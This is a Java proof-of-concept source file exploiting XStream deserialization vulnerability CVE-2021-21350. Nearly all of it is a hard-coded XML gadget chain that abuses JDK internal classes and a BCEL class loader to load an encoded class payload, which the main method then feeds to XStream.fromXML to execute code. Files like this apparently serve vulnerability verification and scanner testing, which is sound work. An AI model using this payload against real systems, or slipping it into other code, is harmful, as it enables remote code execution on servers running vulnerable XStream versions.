package com.sectrend.xstream_v1_4_15;

import com.thoughtworks.xstream.XStream;

/**
 * @author 周德鹏
 * @version 1.0
 * @date 2023/9/20 16:50
 * @describe
 */
public class XSteamPoc_CVE_2021_21350 {
    public static void main(String[] args) {

        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "      <comparator class='javafx.collections.ObservableList$1'/>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\n" +
                "      <dataHandler>\n" +
                "        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
                "          <contentType>text/plain</contentType>\n" +
                "          <is class='java.io.SequenceInputStream'>\n" +
                "            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\n" +
                "              <iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'>\n" +
                "                <names class='java.util.AbstractList$Itr'>\n" +
                "                  <cursor>0</cursor>\n" +
                "                  <lastRet>-1</lastRet>\n" +
                "                  <expectedModCount>0</expectedModCount>\n" +
                "                  <outer-class class='java.util.Arrays$ArrayList'>\n" +
                "                    <a class='string-array'>\n" +
                "                      <string>$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$ddN$c20$Y$3d$85$c9$60$O$e5G$fcW$f0J0Qn$bc$c3$Y$T$83$89$c9$oF$M$5e$97$d9$60$c9X$c9$d6$R$5e$cb$h5$5e$f8$A$3e$94$f1$x$g$q$b1MwrN$cf$f9$be$b6$fb$fcz$ff$Ap$8a$aa$83$MJ$O$caX$cb$a2bp$dd$c6$86$8dM$86$cc$99$M$a5$3egH$d7$h$3d$G$ebR$3d$K$86UO$86$e2$s$Z$f5Et$cf$fb$B$v$rO$f9$3c$e8$f1H$g$fe$xZ$faI$c6T$c3kOd$d0bp$daS_$8c$b5Talc$8bxW$r$91$_$ae$a41$e7$8c$e9d$c8$t$dc$85$8d$ac$8dm$X$3b$d8$a5$d2j$y$c2$da1$afQ$D$3f$J$b8V$91$8b$3d$ecS$7d$Ta$u$98P3$e0$e1$a0$d9$e9$P$85$af$Z$ca3I$aa$e6ug$de$93$a1$f8g$bcKB$zG$d4$d6$Z$I$3d$t$95z$c3$fb$e7$a1$83$5bb$w$7c$86$c3$fa$c2nWG2$i$b4$W$D$b7$91$f2E$i$b7p$80$rzQ3$YM$ba$NR$c8$R$bb$md$84$xG$af$60oH$95$d2$_$b0$k$9eII$c11$3a$d2$f4$cd$c2$ow$9e$94eb$eeO$820$3fC$d0$$$fd$BZ$85Y$ae$f8$N$93$85$cf$5c$c7$B$A$A</string>\n" +
                "                    </a>\n" +
                "                  </outer-class>\n" +
                "                </names>\n" +
                "                <processorCL class='com.sun.org.apache.bcel.internal.util.ClassLoader'>\n" +
                "                  <parent class='sun.misc.Launcher$ExtClassLoader'>\n" +
                "                  </parent>\n" +
                "                  <package2certs class='hashtable'/>\n" +
                "                  <classes defined-in='java.lang.ClassLoader'/>\n" +
                "                  <defaultDomain>\n" +
                "                    <classloader class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='../..'/>\n" +
                "                    <principals/>\n" +
                "                    <hasAllPerm>false</hasAllPerm>\n" +
                "                    <staticPermissions>false</staticPermissions>\n" +
                "                    <key>\n" +
                "                      <outer-class reference='../..'/>\n" +
                "                    </key>\n" +
                "                  </defaultDomain>\n" +
                "                  <packages/>\n" +
                "                  <nativeLibraries/>\n" +
                "                  <assertionLock class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='..'/>\n" +
                "                  <defaultAssertionStatus>false</defaultAssertionStatus>\n" +
                "                  <classes/>\n" +
                "                  <ignored__packages>\n" +
                "                    <string>java.</string>\n" +
                "                    <string>javax.</string>\n" +
                "                    <string>sun.</string>\n" +
                "                  </ignored__packages>\n" +
                "                  <repository class='com.sun.org.apache.bcel.internal.util.SyntheticRepository'>\n" +
                "                    <__path>\n" +
                "                      <paths/>\n" +
                "                      <class__path>.</class__path>\n" +
                "                    </__path>\n" +
                "                    <__loadedClasses/>\n" +
                "                  </repository>\n" +
                "                  <deferTo class='sun.misc.Launcher$ExtClassLoader' reference='../parent'/>\n" +
                "                </processorCL>\n" +
                "              </iterator>\n" +
                "              <type>KEYS</type>\n" +
                "            </e>\n" +
                "            <in class='java.io.ByteArrayInputStream'>\n" +
                "              <buf></buf>\n" +
                "              <pos>0</pos>\n" +
                "              <mark>0</mark>\n" +
                "              <count>0</count>\n" +
                "            </in>\n" +
                "          </is>\n" +
                "          <consumed>false</consumed>\n" +
                "        </dataSource>\n" +
                "        <transferFlavors/>\n" +
                "      </dataHandler>\n" +
                "      <dataLen>0</dataLen>\n" +
                "    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\n" +
                "    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";


        System.out.println("开始");
        XStream xstream = new XStream();
        xstream.fromXML(xml);
        System.out.println("结束");
    }
}
